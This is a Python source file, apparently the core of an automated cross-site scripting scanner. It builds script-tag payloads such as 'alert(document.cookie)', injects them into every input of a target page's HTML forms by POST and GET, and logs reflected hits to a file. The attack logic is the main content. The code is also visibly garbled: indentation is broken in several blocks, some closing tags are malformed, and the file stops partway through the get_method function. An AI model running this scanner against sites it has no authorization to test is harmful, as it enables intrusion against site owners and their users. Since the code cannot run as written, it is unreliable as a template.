from lib.helper.helper import *
from random import randint
from bs4 import BeautifulSoup
from urllib.parse import urljoin,urlparse,parse_qs,urlencode
from lib.helper.Log import *
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class core:
	
	@classmethod
	def generate(self,eff):	
		FUNCTION=[
			"prompt(5000/200)",
			"alert(6000/3000)",
			"alert(document.cookie)",
			"prompt(document.cookie)",
			"console.log(5000/3000)"
		]
		if eff == 1:
			return "<script/>"+FUNCTION[randint(0,4)]+"<\script\>"
			
		elif eff == 2:
			return "<\script/>"+FUNCTION[randint(0,4)]+"<\\script>"	
			
		elif eff == 3:
			return "<\script\> "+FUNCTION[randint(0,4)]+"<//script>"
			
		elif eff == 4:
			return "<script>"+FUNCTION[randint(0,4)]+"<\script/>"
			
		elif eff == 5:
			return "<script>"+FUNCTION[randint(0,4)]+"<//script>"
			
		elif eff == 6:
			return "<script>"+FUNCTION[randint(0,4)]+"</script>"
			
        @classmethod
	def post_method(self):
		bsObj=BeautifulSoup(self.body,"html.parser")
		forms=bsObj.find_all("form",method=True)

		for form in forms:
			try:

				action=form["action"]
			except KeyError:
				action=self.url

			if form["method"].lower().strip() == "post":
				Log.warning("Target have form with POST method: "+C+urljoin(self.url,action))
				Log.info("Collecting form input key.....")

				keys={}
				for key in form.find_all(["input","textarea"]):
					try:
						if key["type"] == "submit":
						      Log.info("Form key name: "+G+key["name"]+N+" value: "+G+"<Submit Confirm>")
						      keys.update({key["name"]:key["name"]})

						else:
							Log.info("Form key name: "+G+key["name"]+N+" value: "+G+self.payload)
							keys.update({key["name"]:self.payload})

						except Exception as e:
						Log.info("Internal error: "+str(e))
					
					Log.info("Sending payload (POST) method...")
					req=self.session.post(urljoin(self.url,action),data=keys)
				        if self.payload in req.text:
						Log.high("Detected XSS (POST) at "+urljoin(self.url,req.url))
						file = open("xss.txt", "a")
						file.write(str(req.url)+"\n\n")
						file.close()
						Log.high("Post data: "+str(keys))
						
					else:
					Log.info("Parameter page using (POST) payloads but not 100% yet...")

	@classmethod
	def get_method_form(self):
		bsObj=BeautifulSoup(self.body,"html.parser")
		forms=bsObj.find_all("form",method=True)

		for form in forms:
			try:

				action=form["action"]
			except KeyError:
				action=self.url
				
					if form["method"].lower().strip() == "get":
				Log.warning("Target have form with GET method: "+C+urljoin(self.url,action))
				Log.info("Collecting form input key.....")

				keys={}
				for key in form.find_all(["input","textarea"]):

					try:
						if key["type"] == "submit":

							Log.info("Form key name: "+G+key["name"]+N+" value: "+G+"<Submit Confirm>")
							keys.update({key["name"]:key["name"]})
				
						else:
							Log.info("Form key name: "+G+key["name"]+N+" value: "+G+self.payload)
							keys.update({key["name"]:self.payload})

				except Exception as e:		
					Log.info("Internal error: "+str(e))

			Log.info("Sending payload (GET) method...")
			req=self.session.get(urljoin(self.url,action),params=keys)
			if self.payload in req.text:
				
				Log.high("Detected XSS (GET) at "+urljoin(self.url,req.url))
				file = open("xss.txt", "a")
				file.write(str(req.url)+"\n\n")
				file.close()
				Log.high("GET data: "+str(keys))
				
			else:
				Log.info("\033[0;35;47m Parameter page using (GET) payloads but not 100% yet...")

	@classmethod
	def get_method(self):
		bsObj=BeautifulSoup(self.body,"html.parser")
		links=bsObj.find_all("a",href=True)
		for a in links:
		url=a["href"]





					






